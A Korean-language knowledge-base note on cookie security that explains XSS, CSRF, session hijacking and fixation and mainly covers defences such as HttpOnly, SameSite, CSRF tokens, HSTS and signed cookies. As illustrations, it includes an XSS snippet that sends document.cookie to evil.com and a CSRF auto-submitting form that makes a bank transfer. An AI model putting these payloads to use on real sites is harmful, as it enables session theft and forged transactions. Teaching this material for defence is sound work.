---
title: "Cookie Security — XSS / CSRF / Hijacking"
kind: knowledge
project: computer-science
agent: engineering-agent/tech-lead
status: current
created_at: 2026-05-13T22:50:00+09:00
tags:
  - network
  - http
  - cookies
  - security
---

# Cookie Security — XSS / CSRF / Hijacking

| 문서 버전 | 작성일 | 작성자 | 주요 변경 사항 |
| --- | --- | --- | --- |
| v.1.0.0 | 2026-05-13 | engineering-agent/tech-lead | 공격 + 방어 |

**[[cookies|↑ Cookies]]** · **[[../http|↑↑ HTTP]]**

---

## 1. 4 가지 위협 + 방어

| 위협 | 방어 |
| --- | --- |
| **XSS** (Cross-Site Scripting) | HttpOnly + CSP |
| **CSRF** (Cross-Site Request Forgery) | SameSite + CSRF token |
| **Session Hijacking** | Secure + HTTPS + 짧은 만료 |
| **Session Fixation** | Login 후 새 Session ID |

---

## 2. XSS 와 Cookie

### 2.1 공격

```javascript
// 공격자가 페이지에 주입한 스크립트
<script>
  fetch('https://evil.com/steal?c=' + document.cookie);
</script>
```

→ 모든 쿠키 (HttpOnly 제외) 가 evil.com 으로.

### 2.2 방어

#### HttpOnly
```http
Set-Cookie: sessionid=abc; HttpOnly
```

→ `document.cookie` 에서 안 보임. JS 가 못 훔침.

#### CSP — Content Security Policy
```http
Content-Security-Policy: default-src 'self'; script-src 'self'
```

→ 인라인 스크립트 / 외부 도메인 스크립트 차단.

#### XSS 자체 방어
- 출력 인코딩 (HTML escape)
- 입력 검증
- React / Vue 자동 escape

자세히 → [[../security/security]]

---

## 3. CSRF 와 Cookie

### 3.1 공격

```html
<!-- 사용자가 evil.com 에 방문 -->
<img src="https://bank.com/transfer?to=hacker&amount=1000">

<!-- 또는 -->
<form action="https://bank.com/transfer" method="POST">
  <input name="to" value="hacker">
  <input name="amount" value="1000">
</form>
<script>document.forms[0].submit()</script>
```

→ 사용자 브라우저가 bank.com 의 쿠키 자동 동봉 → 사용자 의도 X 송금.

### 3.2 방어

#### SameSite Cookie
```http
Set-Cookie: sessionid=abc; SameSite=Strict
```

→ Cross-site 요청에 쿠키 첨부 X. CSRF 거의 막힘.

#### Lax 의 한계
```
SameSite=Lax → top-level GET 은 쿠키 첨부
→ GET 으로 상태 변경하는 응용은 위험 (RFC 위반이지만)
```

#### CSRF Token (Synchronizer pattern)
```html
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="random-abc123">
  ...
</form>
```

```python
def transfer(request):
    if request.csrf_token != request.session.csrf_token:
        return 403
    ...
```

→ 공격자는 token 모름 → 요청 위조 X.

#### Double Submit Cookie
```
1. 쿠키 csrf_token=abc
2. JS 가 쿠키 읽어 X-CSRF-Token: abc 헤더
3. 서버: 쿠키 의 csrf_token == 헤더 의 X-CSRF-Token ?
```

→ JS 가 쿠키 읽어야 — HttpOnly 면 X. 응용 정책.

#### Origin / Referer 검증
```python
def secure_action(request):
    origin = request.headers.get('Origin') or request.headers.get('Referer')
    if not origin.startswith('https://app.example.com'):
        return 403
```

자세히 → [[../security/security]]

---

## 4. Session Hijacking

### 4.1 공격
- Wi-Fi 공유망에서 평문 쿠키 스니핑
- XSS / Malware 가 훔침
- Spoofed Wi-Fi (Evil Twin)
- 옛 — **Firesheep** (2010) — Facebook 등 평문 쿠키 훔침

### 4.2 방어

#### HTTPS 강제
```http
Set-Cookie: sessionid=abc; Secure
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
```

→ HTTP 에 쿠키 송신 X + HSTS 로 HTTPS 강제.

#### 짧은 만료
```http
Set-Cookie: sessionid=abc; Max-Age=3600     (1 시간)
```

→ 도난 시 영향 최소화. Refresh token 으로 갱신.

#### IP / Device Fingerprint 검증
```python
def validate_session(request):
    if request.session.ip != request.ip:
        request.session.invalidate()
        return 401
    if request.session.user_agent != request.user_agent:
        ...
```

→ NAT / Mobile 시 false positive 위험.

#### Session 갱신 (Rotation)
```python
def login(...):
    if request.session.is_authenticated:
        request.session.regenerate()    # 새 ID
    ...
```

---

## 5. Session Fixation

### 5.1 공격
```
1. 공격자가 합법 sessionid=evil123 받음
2. 피해자에게 같은 sessionid 강요 (URL, XSS, ...)
3. 피해자 로그인 — sessionid=evil123 그대로
4. 공격자가 같은 sessionid 로 로그인된 세션 사용
```

### 5.2 방어

#### Login 후 새 Session ID
```python
def login(user, password):
    if authenticate(user, password):
        request.session.regenerate()    # ← 핵심
        request.session.user_id = user.id
```

→ 옛 ID 무효, 새 ID 발급.

#### Session ID 의 강력함
- 충분히 random (UUID v4 또는 256 bit)
- 추측 불가능

---

## 6. Cookie 의 무결성 — 서명 / 암호화

### 6.1 서명 (Signed Cookie)

```python
import hmac
def sign(value, secret):
    sig = hmac.new(secret, value.encode(), 'sha256').hexdigest()
    return f"{value}.{sig}"

def verify(signed, secret):
    value, sig = signed.rsplit('.', 1)
    expected = hmac.new(secret, value.encode(), 'sha256').hexdigest()
    return hmac.compare_digest(sig, expected)
```

→ 사용자가 쿠키 변조 X.

### 6.2 암호화 (Encrypted Cookie)

```python
from cryptography.fernet import Fernet
key = Fernet(secret_key)
encrypted = key.encrypt(b"sensitive data")
```

→ 사용자가 내용 못 봄 + 변조 X.

### 6.3 Framework
- **Express** — `cookie-session` (signed)
- **Django** — `SECRET_KEY` + signed cookie
- **Rails** — encrypted cookie (default)
- **Flask** — `app.secret_key` + itsdangerous

---

## 7. 전체 권장 — 안전한 세션 쿠키

```python
# Python (Flask 등)
response.set_cookie(
    "session",
    value=signed_session_id,
    max_age=3600,                    # 1 시간
    secure=True,                      # HTTPS
    httponly=True,                    # JS X
    samesite="Strict",                # CSRF
    path="/",
    # Domain 명시 X — host-only
)
```

```http
Set-Cookie: __Host-session=<signed-id>;
            Max-Age=3600;
            Secure;
            HttpOnly;
            SameSite=Strict;
            Path=/
```

---

## 8. JWT vs Cookie 비교

자세히 → [[jwt-vs-cookie]]

| 측면 | Cookie | JWT (Localstorage) |
| --- | --- | --- |
| 저장 | 브라우저 cookie jar | localStorage / sessionStorage |
| 전송 | 자동 (HttpOnly) | 수동 (Authorization 헤더) |
| XSS | HttpOnly 면 안전 | JS 가 읽음 — 위험 |
| CSRF | SameSite 또는 token | 자동 첨부 X — 자연 안전 |
| 크기 | 작음 | 큼 |

---

## 9. 모바일 / Native 앱

- 쿠키 대신 JWT + Keychain (iOS) / KeyStore (Android)
- WebView 의 cookie 는 OS 격리
- Refresh token 패턴

---

## 10. 함정

### 함정 1 — HttpOnly 만 믿기
XSS 가 있으면 다른 공격 가능 (DOM 조작, request 위조). XSS 자체 방어.

### 함정 2 — SameSite=Lax 의 GET
중요 작업을 GET 으로 → CSRF 가능. POST + SameSite=Strict.

### 함정 3 — Domain 너무 넓음
`Domain=.example.com` → 모든 subdomain 에 쿠키. Subdomain takeover 위험.
→ `__Host-` prefix 권장.

### 함정 4 — Session ID 의 약한 random
guess 가능 → Account takeover. Crypto 강한 random.

### 함정 5 — Logout 시 cookie 삭제 누락
서버에서 session 무효 + 클라 cookie 삭제 둘 다.

### 함정 6 — Secure 미설정 + HTTP redirect
HTTPS 응답이 HTTP redirect 시 쿠키 노출.

### 함정 7 — CORS + Credentials 의 보안
`Access-Control-Allow-Origin: *` + Credentials → 브라우저 거부 (좋음). 명시 origin.

---

## 11. 학습 자료

- **OWASP Cheat Sheet** — Session Management
- **RFC 6265bis** — modern cookie spec
- "Cross-Site Request Forgery Prevention" — OWASP
- "Cookie Security" — web.dev

---

## 12. 관련

- [[cookies]] — Cookies hub
- [[cookie-attributes]] — 속성
- [[session-cookies]]
- [[../security/security]] — XSS / CSRF
- [[../cors/cors-with-credentials]]
